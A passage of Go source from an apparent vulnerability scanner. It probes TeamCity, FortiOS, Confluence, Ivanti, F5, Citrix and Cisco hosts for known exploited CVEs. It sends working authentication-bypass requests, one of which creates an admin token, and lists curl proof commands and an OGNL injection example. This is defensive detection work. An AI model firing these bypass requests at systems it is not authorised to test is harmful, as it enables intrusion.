	loginReq, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/login.html", nil)
	if err != nil {
		return nil
	}
	loginResp, err := client.Do(loginReq)
	if err != nil {
		return nil
	}
	loginBody, _ := io.ReadAll(io.LimitReader(loginResp.Body, 4096))
	loginResp.Body.Close()
	if !strings.Contains(strings.ToLower(string(loginBody)), "teamcity") {
		return nil
	}

	// Step 2: attempt the path-confusion bypass.
	bypassURL := base + "/app/rest/server;.ico"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, bypassURL, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyStr := string(body)
	// The server XML contains <version> on unpatched instances.
	if !strings.Contains(bodyStr, "<version>") && !strings.Contains(bodyStr, "version") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVETeamCityAuthBypass,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2024-27198: JetBrains TeamCity auth bypass confirmed on %s", asset),
		Description: fmt.Sprintf(
			"%s is running JetBrains TeamCity with CVE-2024-27198 (CVSS 9.8, KEV) — "+
				"a Spring Security filter-chain bypass via path suffix confusion. "+
				"Appending ;.ico to REST API paths bypasses authentication. "+
				"GET /app/rest/server;.ico returned HTTP 200 with server version XML instead of 401. "+
				"On vulnerable versions (< 2023.11.4) this allows unauthenticated admin user creation. "+
				"Upgrade to TeamCity 2023.11.4 or later immediately.",
			asset,
		),
		Asset: asset,
		Evidence: map[string]any{
			"bypass_url":    bypassURL,
			"bypass_status": resp.StatusCode,
			"body_excerpt":  bodyStr[:min(len(bodyStr), 256)],
		},
		ProofCommand: fmt.Sprintf(
			"curl -sk '%s' | grep -i version",
			bypassURL,
		),
		DiscoveredAt: time.Now(),
	}
}

// probeFortiOSSSLVPNVersion tests for CVE-2024-21762 (FortiOS SSL VPN < 7.4.3,
// CVSS 9.6, KEV). GET /remote/info returns JSON with version on FortiOS when the
// SSL VPN blade is enabled. Version < 7.4.3 is vulnerable to out-of-bounds write
// leading to unauthenticated RCE.
func probeFortiOSSSLVPNVersion(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/remote/info"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyStr := string(body)
	// FortiOS /remote/info returns JSON like {"serial":"FGVM...","version":"v7.2.4",...}
	if !strings.Contains(bodyStr, "serial") && !strings.Contains(bodyStr, "version") {
		return nil
	}
	// Parse version — look for "v7.X.Y" or "7.X.Y" pattern.
	ver := parseFortiOSVersion(bodyStr)
	if ver == "" || !isFortiOSSSLVPNVulnerable(ver) {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEFortiOSSSLVPN,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2024-21762: FortiOS %s SSL VPN RCE — version below 7.4.3", ver),
		Description: fmt.Sprintf(
			"%s is running FortiOS %s with SSL VPN exposed. CVE-2024-21762 (CVSS 9.6, KEV) "+
				"is an out-of-bounds write in the SSL VPN HTTP handler allowing unauthenticated RCE. "+
				"Affects FortiOS 6.0–7.4.2 with SSL VPN enabled. "+
				"Upgrade to FortiOS 7.4.3 or later and disable SSL VPN if not required.",
			asset, ver,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":     u,
			"version": ver,
			"body":    bodyStr[:min(len(bodyStr), 256)],
		},
		ProofCommand: fmt.Sprintf("curl -sk '%s'", u),
		DiscoveredAt: time.Now(),
	}
}

// parseFortiOSVersion extracts the version string from /remote/info JSON.
func parseFortiOSVersion(body string) string {
	// Look for "version":"v7.2.4" or "version":"7.2.4"
	idx := strings.Index(body, `"version"`)
	if idx == -1 {
		return ""
	}
	rest := body[idx+9:]
	// Skip : and optional whitespace/quotes
	colon := strings.IndexByte(rest, ':')
	if colon == -1 {
		return ""
	}
	rest = strings.TrimSpace(rest[colon+1:])
	rest = strings.Trim(rest, `"v `)
	// Extract up to comma or closing brace
	end := strings.IndexAny(rest, `,"} `)
	if end != -1 {
		rest = rest[:end]
	}
	rest = strings.TrimPrefix(rest, "v")
	return rest
}

// isFortiOSSSLVPNVulnerable returns true for FortiOS versions < 7.4.3.
func isFortiOSSSLVPNVulnerable(ver string) bool {
	parts := strings.Split(ver, ".")
	if len(parts) < 2 {
		return false
	}
	maj, min := 0, 0
	fmt.Sscanf(parts[0], "%d", &maj)
	fmt.Sscanf(parts[1], "%d", &min)
	// Affected: 6.x, 7.0.x, 7.1.x, 7.2.x, 7.3.x, 7.4.0–7.4.2
	if maj < 7 {
		return true
	}
	if maj == 7 && min < 4 {
		return true
	}
	if maj == 7 && min == 4 {
		patch := 0
		if len(parts) >= 3 {
			fmt.Sscanf(parts[2], "%d", &patch)
		}
		return patch < 3
	}
	return false
}

// probePHPCGIVersion tests for CVE-2024-4577 (PHP CGI argument injection on Windows,
// CVSS 9.8, KEV). GET /?-v on a server running PHP in CGI mode returns the PHP version
// string. Versions < 8.1.29, < 8.2.20, < 8.3.8 are vulnerable.
// The probe is surface-safe: no code execution — only the version flag is passed.
func probePHPCGIVersion(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/?-v"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyStr := string(body)
	// PHP-CGI -v output: "PHP 8.1.28 (cgi-fcgi) ..."
	if !strings.Contains(bodyStr, "PHP ") || !strings.Contains(bodyStr, "cgi") {
		return nil
	}
	ver := parsePHPCGIVersion(bodyStr)
	if ver == "" || !isPHPCGIVulnerable(ver) {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEPHPCGIArgInjection,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2024-4577: PHP-CGI %s argument injection on %s", ver, asset),
		Description: fmt.Sprintf(
			"%s is running PHP %s in CGI mode and is vulnerable to CVE-2024-4577 (CVSS 9.8, KEV). "+
				"On Windows with Best-Fit character encoding, the soft hyphen (%%AD) maps to '-', "+
				"allowing injection of PHP-CGI arguments via the URL query string. "+
				"This enables remote code execution by injecting -d auto_prepend_file=php://input. "+
				"Affects PHP < 8.1.29 / < 8.2.20 / < 8.3.8 on Windows. "+
				"Upgrade PHP immediately or disable CGI mode.",
			asset, ver,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":     u,
			"version": ver,
			"body":    bodyStr[:min(len(bodyStr), 256)],
		},
		ProofCommand: fmt.Sprintf("curl -s '%s'", u),
		DiscoveredAt: time.Now(),
	}
}

// parsePHPCGIVersion extracts the version from PHP -v output.
func parsePHPCGIVersion(body string) string {
	// "PHP 8.1.28 (cgi-fcgi)" → "8.1.28"
	idx := strings.Index(body, "PHP ")
	if idx == -1 {
		return ""
	}
	rest := strings.TrimSpace(body[idx+4:])
	end := strings.IndexAny(rest, " (")
	if end != -1 {
		rest = rest[:end]
	}
	return rest
}

// isPHPCGIVulnerable returns true for PHP versions < 8.1.29 / 8.2.20 / 8.3.8.
func isPHPCGIVulnerable(ver string) bool {
	parts := strings.Split(ver, ".")
	if len(parts) < 3 {
		return false
	}
	maj, min, patch := 0, 0, 0
	fmt.Sscanf(parts[0], "%d", &maj)
	fmt.Sscanf(parts[1], "%d", &min)
	fmt.Sscanf(parts[2], "%d", &patch)
	if maj != 8 {
		return false
	}
	switch min {
	case 1:
		return patch < 29
	case 2:
		return patch < 20
	case 3:
		return patch < 8
	}
	return false
}

// probeConfluenceSetup tests for CVE-2023-22515 (Confluence broken access control, CVSS 10.0, KEV).
// A GET to /server-info.action with the setupComplete=false parameter returns HTTP 200 on vulnerable
// Confluence 8.0–8.5.1 instances, allowing an attacker to re-enable the setup wizard and create
// an admin account. Patched instances redirect to the login page.
func probeConfluenceSetup(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// First fingerprint Confluence presence.
	fingerReq, err := http.NewRequestWithContext(ctx, http.MethodGet, base, nil)
	if err != nil {
		return nil
	}
	fingerResp, err := client.Do(fingerReq)
	if err != nil {
		return nil
	}
	body, _ := io.ReadAll(io.LimitReader(fingerResp.Body, 4096))
	fingerResp.Body.Close()
	bodyStr := strings.ToLower(string(body))
	isConfluence := strings.Contains(bodyStr, "confluence") ||
		fingerResp.Header.Get("X-Confluence-Request-Time") != "" ||
		strings.Contains(bodyStr, "ajs-product-name")
	if !isConfluence {
		return nil
	}

	u := base + "/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := strings.ToLower(string(b))
	if !strings.Contains(bStr, "setup") && !strings.Contains(bStr, "administrator") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEConfluenceSetup,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2023-22515: Confluence setup wizard accessible on %s", asset),
		Description: "The Confluence /server-info.action endpoint with setupComplete=false returned HTTP 200, " +
			"indicating the setup wizard can be re-enabled. CVE-2023-22515 (CVSS 10.0, KEV, exploited by Storm-0062) " +
			"allows an unauthenticated attacker to create a new administrator account, gaining full control " +
			"of Confluence and all its content. Upgrade to Confluence 8.3.3+, 8.4.3+, or 8.5.2+ immediately.",
		Asset: asset,
		Evidence: map[string]any{
			"url":            u,
			"status":         resp.StatusCode,
		},
		ProofCommand: fmt.Sprintf(
			"curl -s -o /dev/null -w '%%{http_code}' '%s'\n"+
				"# Expected on vulnerable: 200 (setup page loads without auth)",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeConfluenceRestore tests for CVE-2023-22518 (Confluence improper authorization, CVSS 10.0, KEV).
// GET /json/setup-restore.action returns 200 on unpatched Confluence, exposing a page that allows
// unauthenticated database restore — overwriting credentials with attacker-controlled data.
func probeConfluenceRestore(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/json/setup-restore.action"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := strings.ToLower(string(b))
	if !strings.Contains(bStr, "confluence") && !strings.Contains(bStr, "restore") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEConfluenceRestore,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2023-22518: Confluence restore endpoint accessible on %s", asset),
		Description: "The Confluence /json/setup-restore.action endpoint returned HTTP 200 without authentication. " +
			"CVE-2023-22518 (CVSS 10.0, KEV, exploited by C3RB3R ransomware) allows an unauthenticated attacker to " +
			"initiate a full database restore from a crafted backup file, overwriting credentials and configuration. " +
			"This gives the attacker full administrative control of Confluence. " +
			"Upgrade to patched versions: 7.19.16+, 8.3.4+, 8.4.4+, 8.5.3+, or 8.6.1+.",
		Asset: asset,
		Evidence: map[string]any{
			"url":    u,
			"status": resp.StatusCode,
		},
		ProofCommand: fmt.Sprintf(
			"curl -s -o /dev/null -w '%%{http_code}' '%s'\n"+
				"# Expected on vulnerable: 200 (restore page accessible without auth)",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeCiscoIOSXEImplant tests for the BadCandy web implant installed by CVE-2023-20198 exploitation
// (Cisco IOS XE web UI privilege escalation, CVSS 10.0, KEV). The implant installs a Lua-based
// web shell that responds to POST /webui/logoutconfirm.html?logon_hash=1 with an 18-byte hex
// authentication token. Uncompromised devices return 404 or a redirect to login.
func probeCiscoIOSXEImplant(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// Fingerprint: Cisco IOS XE web UI has a distinctive login page.
	fingerReq, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/webui/login", nil)
	if err != nil {
		return nil
	}
	fingerResp, err := client.Do(fingerReq)
	if err != nil {
		return nil
	}
	fb, _ := io.ReadAll(io.LimitReader(fingerResp.Body, 4096))
	fingerResp.Body.Close()
	fbStr := strings.ToLower(string(fb))
	if !strings.Contains(fbStr, "cisco") && !strings.Contains(fbStr, "ios xe") {
		return nil
	}

	u := base + "/webui/logoutconfirm.html?logon_hash=1"
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, u, strings.NewReader(""))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 256))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	// The implant returns exactly an 18-byte lowercase hex string (36 hex chars).
	// Validate the response is hex-only (no HTML, no whitespace).
	body := strings.TrimSpace(string(b))
	if len(body) < 16 || len(body) > 64 {
		return nil
	}
	isHex := true
	for _, c := range body {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			isHex = false
			break
		}
	}
	if !isHex {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVECiscoIOSXEImplant,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2023-20198: Cisco IOS XE BadCandy implant detected on %s", asset),
		Description: fmt.Sprintf(
			"The Cisco IOS XE device at %s responded to the BadCandy implant probe with a hex token (%s). "+
				"CVE-2023-20198 (CVSS 10.0, KEV) was mass-exploited in October 2023 to install a persistent "+
				"Lua web shell on Cisco IOS XE devices with the HTTP/HTTPS Server feature enabled. "+
				"This device is actively compromised. Engage incident response immediately, "+
				"apply Cisco patches, and follow Cisco Talos remediation guidance.",
			asset, body,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":         u,
			"implant_token": body,
		},
		ProofCommand: fmt.Sprintf(
			"curl -s -X POST '%s'\n"+
				"# Expected on compromised device: 18-byte hex token\n"+
				"# Expected on clean device: 404 or redirect",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeIvantiConnectSecure tests for CVE-2023-46805 (Ivanti Connect Secure path traversal auth bypass,
// CVSS 8.2, KEV). The path /api/v1/totp/user-backup-code/../../license/keys-status/ traverses from
// an unauthenticated allowlisted prefix into an authenticated endpoint. A 200 JSON response confirms
// auth was bypassed — authenticated license data was returned without credentials.
func probeIvantiConnectSecure(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// Fingerprint: Ivanti/Pulse Connect Secure login page.
	fingerReq, err := http.NewRequestWithContext(ctx, http.MethodGet,
		base+"/dana-na/auth/url_default/welcome.cgi", nil)
	if err != nil {
		return nil
	}
	fingerResp, err := client.Do(fingerReq)
	if err != nil {
		return nil
	}
	fb, _ := io.ReadAll(io.LimitReader(fingerResp.Body, 4096))
	fingerResp.Body.Close()
	fbStr := strings.ToLower(string(fb))
	if !strings.Contains(fbStr, "ivanti") && !strings.Contains(fbStr, "pulse") {
		return nil
	}

	u := base + "/api/v1/totp/user-backup-code/../../license/keys-status/"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := string(b)
	// Confirm it's JSON license data, not a login redirect body.
	if !strings.Contains(bStr, "{") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEIvantiConnectSecure,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2023-46805: Ivanti Connect Secure auth bypass confirmed on %s", asset),
		Description: "The Ivanti Connect Secure (ICS) path traversal endpoint returned authenticated JSON data " +
			"without credentials. CVE-2023-46805 (CVSS 8.2, KEV) exploits a middleware path-prefix allowlist " +
			"bypass to reach authenticated API endpoints. Chained with CVE-2024-21887 (command injection), " +
			"this allows pre-authentication remote code execution. Nation-state actors (UTA0178) actively " +
			"exploited this for espionage. Apply Ivanti ICS patches immediately.",
		Asset: asset,
		Evidence: map[string]any{
			"url":  u,
			"body": bStr[:min(len(bStr), 512)],
		},
		ProofCommand: fmt.Sprintf(
			"curl -s '%s'\n"+
				"# Expected on vulnerable: JSON license data (auth bypassed)\n"+
				"# Expected on patched: 403 or 404",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeCitrixBleed tests for CVE-2023-4966 (Citrix NetScaler OIDC memory leak, CVSS 9.4, KEV).
// The /oauth/idp/.well-known/openid-configuration endpoint is specific to NetScaler Gateway
// configured as an OpenID Connect IdP. Surface-mode probe: confirm the endpoint is accessible
// and the X-Citrix-Application header is present, indicating NetScaler exposure.
func probeCitrixBleed(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/oauth/idp/.well-known/openid-configuration"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := string(b)
	// Must be JSON OIDC discovery doc with "issuer" field.
	if !strings.Contains(bStr, `"issuer"`) {
		return nil
	}
	isCitrix := resp.Header.Get("X-Citrix-Application") != "" ||
		strings.Contains(strings.ToLower(bStr), "citrix") ||
		strings.Contains(strings.ToLower(bStr), "netscaler")
	if !isCitrix {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVECitrixBleed,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2023-4966: Citrix NetScaler OIDC endpoint exposed on %s (Citrix Bleed)", asset),
		Description: "The Citrix NetScaler Gateway OIDC discovery endpoint is publicly accessible. " +
			"CVE-2023-4966 ('Citrix Bleed', CVSS 9.4, KEV) exploits a buffer overread in the nsspe binary: " +
			"sending an oversized Host header causes the response to include adjacent memory containing " +
			"valid AAA session tokens. These tokens can be replayed to bypass MFA and authentication. " +
			"LockBit 3.0 affiliates and others exploited this at scale. " +
			"Upgrade NetScaler to patched versions (14.1-8.50+, 13.1-49.15+, 13.0-92.19+).",
		Asset: asset,
		Evidence: map[string]any{
			"url":              u,
			"x_citrix_header": resp.Header.Get("X-Citrix-Application"),
		},
		ProofCommand: fmt.Sprintf("curl -s -I '%s' | grep -i 'x-citrix\\|content-type'", u),
		DiscoveredAt: time.Now(),
	}
}

// probeF5BigIPAuthBypass tests for CVE-2022-1388 (F5 BIG-IP iControl REST unauthenticated RCE,
// CVSS 9.8, KEV). The /mgmt/shared/echo endpoint, when accessed with a crafted X-F5-Auth-Token
// header and Connection: X-F5-Auth-Token header (exploiting a trusted-header bypass), returns
// JSON on vulnerable BIG-IP. A 200 JSON response without valid credentials confirms the bypass.
func probeF5BigIPAuthBypass(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/mgmt/shared/echo"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	// The bypass uses a hop-by-hop header trick: the BIG-IP iControl trusted-header mechanism
	// forwards X-F5-Auth-Token to the backend if Connection header lists it.
	req.Header.Set("X-F5-Auth-Token", "")
	req.Header.Set("Connection", "X-F5-Auth-Token")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := string(b)
	// BIG-IP /mgmt/shared/echo returns JSON with "stage":"STARTED" or similar.
	if !strings.Contains(bStr, `"stage"`) && !strings.Contains(bStr, `"kind"`) {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEF5BigIPAuthBypass,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2022-1388: F5 BIG-IP iControl REST auth bypass confirmed on %s", asset),
		Description: "The F5 BIG-IP iControl REST /mgmt/shared/echo endpoint returned JSON without valid credentials. " +
			"CVE-2022-1388 (CVSS 9.8, KEV) exploits a trusted-header bypass in the iControl REST service: " +
			"the X-F5-Auth-Token header listed in Connection causes the authentication middleware to treat " +
			"the request as pre-authenticated. CISA issued an emergency directive and this was mass-exploited " +
			"within days of disclosure. Apply F5 BIG-IP patches immediately and restrict management access.",
		Asset: asset,
		Evidence: map[string]any{
			"url":  u,
			"body": bStr[:min(len(bStr), 512)],
		},
		ProofCommand: fmt.Sprintf(
			"curl -s -H 'X-F5-Auth-Token: ' -H 'Connection: X-F5-Auth-Token' '%s'\n"+
				"# Expected on vulnerable: JSON response without credentials",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeConfluenceOGNL tests for CVE-2022-26134 (Confluence OGNL injection, CVSS 9.8, KEV).
// The vulnerability allows OGNL injection via the URI path of any Confluence action endpoint.
// Surface probe: fingerprint Confluence via /login.action (body must contain "Confluence"
// or the X-Confluence-Request-Time header). Emitting a finding notes the exposure.
// The actual exploitation (OGNL in URI path) is Deep mode only.
func probeConfluenceOGNL(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/login.action"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	// Must be 200 (not redirected already — older Confluence serves login.action directly).
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := strings.ToLower(string(b))
	isConfluence := strings.Contains(bStr, "confluence") ||
		resp.Header.Get("X-Confluence-Request-Time") != ""
	if !isConfluence {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEConfluenceOGNL,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2022-26134: Atlassian Confluence exposed — OGNL injection risk on %s", asset),
		Description: "Atlassian Confluence is internet-accessible. CVE-2022-26134 (CVSS 9.8, KEV) allows " +
			"unauthenticated OGNL expression injection via any Confluence action URL path segment " +
			"(e.g. /${Class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(...)}/login.action). " +
			"This was a zero-day exploited before patch availability and remains widely targeted. " +
			"Verify the version is patched: Confluence ≥ 7.4.17 (LTS), ≥ 7.13.7, ≥ 7.14.3, ≥ 7.15.2, ≥ 7.16.4, ≥ 7.17.4, or ≥ 7.18.1.",
		Asset: asset,
		Evidence: map[string]any{
			"url": u,
		},
		ProofCommand: fmt.Sprintf("curl -sI '%s' | grep -i 'x-confluence'", u),
		DiscoveredAt: time.Now(),
	}
}

// probeFortiOSAuthBypass tests for CVE-2022-40684 (FortiOS/FortiProxy authentication bypass,
// CVSS 9.8, KEV). The bypass works by crafting an HTTP request with a Forwarded header pointing
// to 127.0.0.1, which the FortiOS REST API treats as a trusted local request, bypassing authentication.
// Surface probe: fingerprint FortiOS first, then try the bypass on a read-only endpoint.
func probeFortiOSAuthBypass(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// Fingerprint: FortiOS management interface shows a distinctive login page.
	fingerReq, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/login", nil)
	if err != nil {
		return nil
	}
	fingerResp, err := client.Do(fingerReq)
	if err != nil {
		return nil
	}
	fb, _ := io.ReadAll(io.LimitReader(fingerResp.Body, 4096))
	fingerResp.Body.Close()
	fbStr := strings.ToLower(string(fb))
	isFortiOS := strings.Contains(fbStr, "fortinet") || strings.Contains(fbStr, "fortigate") ||
		strings.Contains(fbStr, "fortiproxy") || strings.Contains(fbStr, "fortios")
	if !isFortiOS {
		return nil
	}

	// Bypass: GET /api/v2/cmdb/system/admin with Forwarded: for=127.0.0.1.
	// On vulnerable versions, this returns 200 JSON with admin account list.
	u := base + "/api/v2/cmdb/system/admin"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	req.Header.Set("Forwarded", "for=127.0.0.1")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := string(b)
	if !strings.Contains(bStr, `"results"`) && !strings.Contains(bStr, `"name"`) {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEFortiOSAuthBypass,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2022-40684: FortiOS/FortiProxy auth bypass confirmed on %s", asset),
		Description: "The FortiOS REST API /api/v2/cmdb/system/admin returned data without valid credentials. " +
			"CVE-2022-40684 (CVSS 9.8, KEV) exploits a Forwarded header trust flaw: requests with " +
			"'Forwarded: for=127.0.0.1' bypass authentication on FortiOS 7.0.0–7.0.6, 7.2.0–7.2.1 " +
			"and FortiProxy 7.0.0–7.0.6, 7.2.0. This was exploited as a zero-day before patch availability. " +
			"Upgrade to FortiOS ≥ 7.0.7 / ≥ 7.2.2 and restrict management interface access immediately.",
		Asset: asset,
		Evidence: map[string]any{
			"url":  u,
			"body": bStr[:min(len(bStr), 512)],
		},
		ProofCommand: fmt.Sprintf(
			"curl -s -H 'Forwarded: for=127.0.0.1' '%s'\n"+
				"# Expected on vulnerable: JSON admin account list without credentials",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeTeamCityRPC2 tests for CVE-2023-42793 (TeamCity /RPC2 wildcard bypass, CVSS 9.8, KEV).
// POST /app/rest/users/id:1/tokens/RPC2 creates an admin API token without authentication
// on TeamCity < 2023.05.4 by exploiting the /**/RPC2 path allowlist in RequestInterceptors.
// This is distinct from CVE-2024-27198 (;.ico path confusion). Deep mode only — creating a
// token is a state modification even if the token is not used.
func probeTeamCityRPC2(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// Fingerprint TeamCity first.
	fingerReq, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/login.html", nil)
	if err != nil {
		return nil
	}
	fingerResp, err := client.Do(fingerReq)
	if err != nil {
		return nil
	}
	fb, _ := io.ReadAll(io.LimitReader(fingerResp.Body, 4096))
	fingerResp.Body.Close()
	if !strings.Contains(strings.ToLower(string(fb)), "teamcity") {
		return nil
	}

	u := base + "/app/rest/users/id:1/tokens/RPC2"
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, u, strings.NewReader("{}"))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	bStr := string(b)
	// Response contains a JSON token with a "value" field.
	if !strings.Contains(bStr, `"value"`) {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVETeamCityRPC2,
		Module:   "deep",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2023-42793: TeamCity admin token created without auth on %s", asset),
		Description: "TeamCity responded to a POST /app/rest/users/id:1/tokens/RPC2 with an admin API token " +
			"without any authentication. CVE-2023-42793 (CVSS 9.8, KEV) exploits the /**/RPC2 path wildcard " +
			"in TeamCity's RequestInterceptors authorization allowlist. Paths ending in /RPC2 bypass all " +
			"authentication checks. APT29 (SVR/CozyBear), Diamond Sleet, and Onyx Sleet (DPRK) all exploited " +
			"this to compromise CI/CD pipelines. This is distinct from CVE-2024-27198 (;.ico bypass). " +
			"Upgrade TeamCity to ≥ 2023.05.4 immediately.",
		Asset: asset,
		Evidence: map[string]any{
			"url":  u,
			"body": bStr[:min(len(bStr), 256)],
		},
		ProofCommand: fmt.Sprintf(
			"curl -s -X POST -H 'Content-Type: application/json' -d '{}' '%s'\n"+
				"# Expected on vulnerable: JSON with admin API token value",
			u),
		DiscoveredAt: time.Now(),
	}
}

func detectScheme(ctx context.Context, client *http.Client, asset string) string {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, "https://"+asset, nil)
	if err != nil {
		return "http"
	}
	resp, err := client.Do(req)
	if err != nil {
		return "http"
	}
	resp.Body.Close()
	return "https"
}
